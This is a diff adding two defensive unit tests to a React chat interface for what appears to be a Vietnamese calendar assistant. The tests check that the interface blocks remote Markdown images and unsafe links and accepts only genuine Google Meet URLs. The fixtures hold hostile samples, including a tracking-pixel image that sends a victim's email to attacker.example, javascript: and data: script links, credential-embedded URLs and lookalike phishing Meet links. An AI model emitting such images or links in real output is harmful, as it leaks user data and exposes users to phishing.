@@ -164,6 +164,127 @@ describe('ChatInterface Component UX & States', () => {
     expect(listElements.length).toBe(2);
   });
 
+  it('blocks remote Markdown images and restricts Markdown links to safe https and mailto URLs', () => {
+    mockUseChat.mockReturnValue({
+      messages: [
+        {
+          id: 'msg-md-sec',
+          role: 'assistant',
+          content: [
+            'Tóm tắt lịch hẹn:',
+            '![Tracking Pixel](https://attacker.example/exfil?email=victim@example.com)',
+            '* [JS](javascript:alert(1))',
+            '* [Data](data:text/html,<script>alert(1)</script>)',
+            '* [HTTP](http://insecure.example/login)',
+            '* [Creds](https://user:pass@example.com/private)',
+            '* [Tài liệu](https://docs.example.com/agenda)',
+            '* [Liên hệ](mailto:partner@company.com)',
+          ].join('\n'),
+        },
+      ],
+      input: '',
+      handleInputChange: vi.fn(),
+      handleSubmit: vi.fn(),
+      isLoading: false,
+      error: undefined,
+      reload: vi.fn(),
+      setInput: vi.fn(),
+      setMessages: vi.fn(),
+    });
+
+    const { container } = render(<ChatInterface isAuthenticated={true} />);
+
+    expect(container.querySelectorAll('img')).toHaveLength(0);
+    expect(screen.getByText('JS').closest('a')).toBeNull();
+    expect(screen.getByText('Data').closest('a')).toBeNull();
+    expect(screen.getByText('HTTP').closest('a')).toBeNull();
+    expect(screen.getByText('Creds').closest('a')).toBeNull();
+
+    const safeHttpsLink = screen.getByRole('link', { name: 'Tài liệu' });
+    expect(safeHttpsLink).toHaveAttribute('href', 'https://docs.example.com/agenda');
+    expect(safeHttpsLink).toHaveAttribute('rel', 'noopener noreferrer');
+
+    const safeMailtoLink = screen.getByRole('link', { name: 'Liên hệ' });
+    expect(safeMailtoLink).toHaveAttribute('href', 'mailto:partner@company.com');
+  });
+
+  it('renders Meet button in listUpcomingEvents only for verified https://meet.google.com URLs without credentials', () => {
+    mockUseChat.mockReturnValue({
+      messages: [
+        {
+          id: 'msg-upcoming-sec',
+          role: 'assistant',
+          content: '',
+          toolInvocations: [
+            {
+              toolCallId: 'call-upcoming-1',
+              toolName: 'listUpcomingEvents',
+              state: 'result',
+              args: { range: 'upcoming' },
+              result: {
+                success: true,
+                events: [
+                  {
+                    id: 'evt-phish',
+                    summary: 'Lời mời giả mạo',
+                    start: '2026-11-25T09:00:00+07:00',
+                    hangoutLink: 'https://meet.google.com.evil.test/phish',
+                    htmlLink: 'https://calendar.google.com/event?eid=1',
+                  },
+                  {
+                    id: 'evt-http',
+                    summary: 'Liên kết HTTP',
+                    start: '2026-11-25T10:00:00+07:00',
+                    hangoutLink: 'http://phishing.example/meet',
+                    htmlLink: 'https://calendar.google.com/event?eid=2',
+                  },
+                  {
+                    id: 'evt-creds',
+                    summary: 'Liên kết chứa user:pass',
+                    start: '2026-11-25T11:00:00+07:00',
+                    hangoutLink: 'https://user:pass@meet.google.com/abc-defg-hij',
+                    htmlLink: 'https://calendar.google.com/event?eid=3',
+                  },
+                  {
+                    id: 'evt-js',
+                    summary: 'Liên kết javascript',
+                    start: '2026-11-25T12:00:00+07:00',
+                    hangoutLink: 'javascript:alert(1)',
+                    htmlLink: 'https://calendar.google.com/event?eid=4',
+                  },
+                  {
+                    id: 'evt-valid',
+                    summary: 'Họp chính thức',
+                    start: '2026-11-25T14:00:00+07:00',
+                    hangoutLink: 'https://meet.google.com/abc-defg-hij',
+                    htmlLink: 'https://calendar.google.com/event?eid=5',
+                  },
+                ],
+              },
+            },
+          ],
+        },
+      ],
+      input: '',
+      handleInputChange: vi.fn(),
+      handleSubmit: vi.fn(),
+      isLoading: false,
+      error: undefined,
+      reload: vi.fn(),
+      setInput: vi.fn(),
+      setMessages: vi.fn(),
+    });
+
+    render(<ChatInterface isAuthenticated={true} />);
+
+    expect(screen.getByText('Lời mời giả mạo')).toBeInTheDocument();
+    expect(screen.getByText('Họp chính thức')).toBeInTheDocument();
+
+    const meetLinks = screen.getAllByRole('link', { name: /Meet/i });
+    expect(meetLinks).toHaveLength(1);
+    expect(meetLinks[0]).toHaveAttribute('href', 'https://meet.google.com/abc-defg-hij');
+  });
+
   it('renders clear session button when messages exist and calls onClearSession on click', () => {
     const mockSetMessages = vi.fn();
     const mockClearSession = vi.fn();
